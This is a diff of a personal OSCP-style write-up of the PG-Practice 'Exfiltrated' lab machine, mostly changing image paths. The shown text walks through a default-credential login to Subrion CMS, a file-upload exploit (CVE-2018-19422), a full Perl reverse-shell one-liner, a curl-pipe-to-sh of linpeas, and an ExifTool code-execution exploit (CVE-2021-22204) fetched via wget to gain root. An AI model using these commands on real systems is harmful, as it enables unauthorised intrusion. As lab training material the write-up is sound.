@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-02
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Easy
@@ -69,7 +70,7 @@ No enumeration conducted
 ## Port 80 - HTTP (Apache httpd 2.4.41)
 - Updated `/etc/hosts` with `192.168.155.163 http://exfiltrated.offsec`
 - Visited http://exfiltrated.offsec in FireFox Browser
-![[Pasted image 20241002175938.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241002175938.png]]
 	- 
 - Viewed http://exfiltrated.offsec page source (saved as http-page-source.txt)
 		- "Powered by Subrion 4.2" - Subrion 4.2 CMS
@@ -77,40 +78,40 @@ No enumeration conducted
 		- "//exfiltrated.offsec/modules/fancybox/js/jquery.fancybox.css"
 			- Running fancybox (JQuery)
 - Visited http://exfiltrated.offsec/robots.txt
-![[Pasted image 20241002181025.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241002181025.png]]
 - Visited http://exfiltrated.offsec/panel/
-![[Pasted image 20241002181853.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241002181853.png]]
 	- Attempted login: 
 		- admin:admin = SUCCESSFUL
-		![[Pasted image 20241002182025.png]]
+		![[Cybersecurity-Resources/images/Pasted image 20241002182025.png]]
 		- Checked PHP Info (PHP Version 7.4.3)
-		![[Pasted image 20241002182354.png]]
+		![[Cybersecurity-Resources/images/Pasted image 20241002182354.png]]
 		- Configuration Info 
-		![[Pasted image 20241002182616.png]]
+		![[Cybersecurity-Resources/images/Pasted image 20241002182616.png]]
 		- Apache Environment
-		![[Pasted image 20241002182705.png]]
+		![[Cybersecurity-Resources/images/Pasted image 20241002182705.png]]
 		- exif support enabled
-		![[Pasted image 20241002182908.png]]
+		![[Cybersecurity-Resources/images/Pasted image 20241002182908.png]]
 
 ---
 
 # Exploitation
 ## CVE-2018-19422 - Subrion CMS 4.2.1 (Arbitrary File Upload)
 Used exploit 49876.py with `admin:admin` credentials to achieve webshell, then established a reverse shell with Perl;
-![[Pasted image 20241002200817.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241002200817.png]]
 Perl reverse Shell
 ```
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.198:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 Caught with NetCat Listener on 4444
-![[Pasted image 20241002200950.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241002200950.png]]
 
 ---
 # Privilege Escalation
 ## Local Enumeration
 Attempted access to `/root` folder (permission denied), then downloaded & ran linpeas.sh
 `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
-![[Pasted image 20241002201246.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241002201246.png]]
 > - System info: Linux version 5.4.0-74-generic
 > - OS: Ubuntu 20.04.2 LTS (focal)
 > - Sudo v1.8.31
@@ -174,31 +175,31 @@ Attempted access to `/root` folder (permission denied), then downloaded & ran li
 > 	Subsystem       sftp    /usr/lib/openssh/sftp-server
 > 
 > Cron Jobs
-> ![[Pasted image 20241002202522.png]]
+> ![[Cybersecurity-Resources/images/Pasted image 20241002202522.png]]
 - Identified `bash /opt/image-exif.sh` (aka exiftool) running constantly
 - Multiple exploits available for `exiftool`
 ## Privilege Escalation vector
 ### Exploit - ExifTool 12.23 - Arbitrary Code Execution
 - EDB-ID: 50911 CVE-2021-22204
 - First attempt running exploit failed (missing dependencies)
-![[Pasted image 20241003194919.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003194919.png]]
 - Checked exploit script, found dependencies, 
 - Installed: `sudo apt install djvulibre-bin` & `sudo apt install exiftool`
 - Re-ran exploit 49876.py & created `image.jpg`
-![[Pasted image 20241003195231.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003195231.png]]
 - Served `image.jpg` on http webserver: `python3 -m http.server 80`
 - Launched netcat listener: `nc -nvlp 4567`
 - Uploaded `image.jpg` to target machine from shell on port 4444: 
   `wget http://192.168.45.198/image.jpg`
-![[Pasted image 20241003200145.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003200145.png]]
 - Waited for reverse shell to port 4567, and established user is `root`
-![[Pasted image 20241003200430.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003200430.png]]
 - Navigated to root directory and printed `proof.txt`
-![[Pasted image 20241003200649.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003200649.png]]
 - Checked `/etc/passwd` for other users, found `coaran:x:1000:1000::/home/coaran:/bin/bash`
-![[Pasted image 20241003201209.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003201209.png]]
 - Navigated to `coaran` home & found `local.txt`
-![[Pasted image 20241003201320.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003201320.png]]
 ---
 # Trophy & Loot
 `local.txt` = `011940b8f5252122e347d49940222cc1`
